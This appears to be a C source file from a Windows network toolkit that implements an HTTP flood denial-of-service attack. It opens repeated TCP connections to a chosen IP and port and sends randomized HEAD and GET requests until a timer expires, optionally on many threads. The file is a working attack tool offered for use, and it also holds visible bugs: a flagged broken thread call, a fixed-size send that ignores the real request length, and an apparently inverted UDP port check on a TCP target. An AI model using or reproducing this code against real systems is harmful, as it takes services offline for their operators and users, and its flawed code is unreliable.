
/* 
 * NetworkInfoGather
 * Copyright (C) 2023  SecuProject
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <iphlpapi.h>   // IPAddr


#include "Network.h"
#include "Message.h"
#include "AttackDOS.h"
#include "PortScan.h"
#include "ToolsHTTP.h"

int HttpDosConnection(SOCKADDR_IN ServerAddr, char* ipAddress) {
    SOCKET SendingSocket;

    SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (SendingSocket == INVALID_SOCKET) {
        PrintSocketError("Client: socket() failed! Error code");
        return FALSE;
    }

    const char flag = TRUE;
    setsockopt(SendingSocket, SOL_SOCKET, SO_KEEPALIVE, &flag, sizeof(flag));
    int iResult = connect(SendingSocket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr));
    if (iResult != 0) {
        PrintSocketError("Connect() failed! Error code");
        closesocket(SendingSocket);
        return FALSE;
    }

    char payload[1024];
    char method[5];

    //Randomly mix between head and get requests.
    if ((rand() % 2) == 0) {
        strcpy_s(method, 5, "HEAD");
    } else {
        strcpy_s(method, 5, "GET");
    }

    int random = rand();
    sprintf_s(payload, 1024, "%s /%i HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: Keep-Alive\r\n"
        // "Content-Length: "
        , method, random, ipAddress, userAgentList[rand() % 5]);


    // Send an initial buffer
    iResult = send(SendingSocket, payload, (int)sizeof(payload), 0);
    if (iResult == SOCKET_ERROR) {
        PrintSocketError("Send failed with error");
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(SendingSocket);
        return FALSE;
    }
    printf("[i] Bytes Sent: %ld\n", iResult); // connection close 
    closesocket(SendingSocket);
    return TRUE;
}

DWORD WINAPI ThreadHttpDosConnection(LPVOID lpParam) {
    PTHREAD_STRUCT_HTTP_DOS pThreadData = (PTHREAD_STRUCT_HTTP_DOS)lpParam;
    SOCKADDR_IN ServerAddr = pThreadData->ServerAddr;
    char* ipAddress = pThreadData->ipAddress;
    return HttpDosConnection(ServerAddr, ipAddress);
}

BOOL AttackFloodHttp(char* ipAddress, int port, int waitTime, UINT bufferSize, BOOL isMultith) {
    clock_t startTime = clock();
    clock_t currentTime = clock();
    SOCKADDR_IN ssin = InitSockAddr(ipAddress, port);
    THREAD_STRUCT_HTTP_DOS threadStructHttpDos = {
        .ServerAddr = ssin,
        .ipAddress = ipAddress,
        .bufferSize = bufferSize
    };
    int sizeDataSize = 0;

    if (scanPortOpenUDP(ipAddress, port, NULL)) {
        printf("[X] Port %i is CLOSE !\n", port);
        printf("[X] Unable to perform the DOS attack !\n\n");
        return FALSE;
    } else
        printf("[*] Port %i is OPEN !\n", port);


    for (int i = 0; startTime + waitTime > currentTime; i++) {
        DWORD ThreadId = 0;
        if (isMultith) {
            // ERROR ???

            HANDLE Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)HttpDosConnection, &ThreadHttpDosConnection, 0, &ThreadId);
            if (Thread != NULL) {
                printf("Create Thread with id: %lu\n", ThreadId);
                CloseHandle(Thread);
            }
        } else {
            sizeDataSize += HttpDosConnection(ssin, ipAddress);
            //sizeDataSize += HttpDosConnection(ssin, ipAddress, bufferSize);
            printf("[i] Bytes Sent: %ld kb\r", sizeDataSize / 1000);
        }
        currentTime = clock();
    }
    printf("\n[!] Attack done !\n");
    return sizeDataSize;
}